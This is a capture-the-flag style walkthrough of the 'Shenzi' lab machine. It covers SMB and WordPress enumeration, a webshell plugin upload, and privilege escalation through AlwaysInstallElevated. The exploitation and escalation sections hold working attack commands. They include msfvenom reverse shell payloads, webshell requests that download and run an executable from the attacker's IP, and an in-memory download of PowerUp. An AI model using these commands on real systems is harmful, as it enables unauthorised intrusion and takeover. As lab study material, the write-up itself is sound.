# Shenzi

## Enumeration & scanning

- Find XAMPP webapp. Can't access Phpmyadmin. Nothing else to be found.
- Find SMB, login as anonymous and find a set of files related to the webapp. Contains a `passwords.txt` file that describes the webapp setup. This references Wordpress and the related admin password (`admin:FeltHeadwallWight357`).
- Can't easily find Wordpress site. However, using the term `shenzi` as directory it appears.
- We can login to the Wordpress admin portal.

``` sh
# Default scanning
sudo nmap -p- 192.168.114.55
sudo nmap -p 21,80,135,139,443,445,3306,5040,7680 -A 192.168.114.55
nuclei -target http://192.168.114.55

# SMB
smbclient -L //192.168.114.55 -N

# Wordpress
https://192.168.163.55/shenzi/wp-admin
```

## Exploitation

- Upload Wordpress webshell plugin.
- Generate msfvenom payload and get reverse shell.
- Get local flag.

``` sh
# Upload plugin
# Validate
http://192.168.114.55/shenzi/wp-content/plugins/wp_webshell/wp_webshell.php?cmd=whoami

# Generate payload
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.218 LPORT=4444 -f exe -o shell.exe
# Get shell
http://192.168.114.55/shenzi/wp-content/plugins/wp_webshell/wp_webshell.php?cmd=powershell%20-command%20%22iwr%20-uri%20http://192.168.45.218/shell.exe%20-Outfile%20shell.exe%22
# Get flag
```

## Privilege Escalation

- Even though we can replace XAMPP binaries, it is not running as a service. It is an autorun that runs as user.
- Run PowerUp to enumerate further. We find registry setting `AlwaysInstallElevated` set to true, meaning any MSI can be installed under SYSTEM easily.

``` sh
# XAMPP checks
# Binary permissions
icacls "C:\xampp\xampp_start.exe"
# Autostart
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Name     : xampp-control - Shortcut
command  : xampp-control - Shortcut.lnk
Location : Startup
User     : SHENZI\shenzi

# Load PowerUp.ps1 in memory and execute
# /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
python3 -m http.server 80
iex ([System.Net.WebClient]::new().DownloadString('http://192.168.45.218:8000/PowerUp.ps1'))
Invoke-PrivEscAudit

# Exploit AlwayInstallElevated
# Generate and upload .msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.218 LPORT=4446 -f msi -o malicious.msi
iwr -uri http://192.168.45.218/malicious.msi -Outfile malicious.msi
# Execute
nc -nlvp 4446
msiexec /i malicious.msi /quiet
# Get flag
```

## References

- https://github.com/XK3NF4/webshell-plugin-wordpress
- https://rgbwiki.com/Red%20Cell/04.%20Privilege%20Escalation/Windows/PowerUp.ps1/#overview
- https://reaper.gitbook.io/my-penetration-test-guide/privilege-escalation/windows-privilege-escalation/exploiting-alwaysinstallelevated
- https://hackwithmike.gitbook.io/oscp/methodology/oscp-last-minute-tips

## Rabbit holes

- Don't just use winPEAS, also other scripts such as PowerUp.
- When stuck, use box name for ideas (see last minute tips reference).
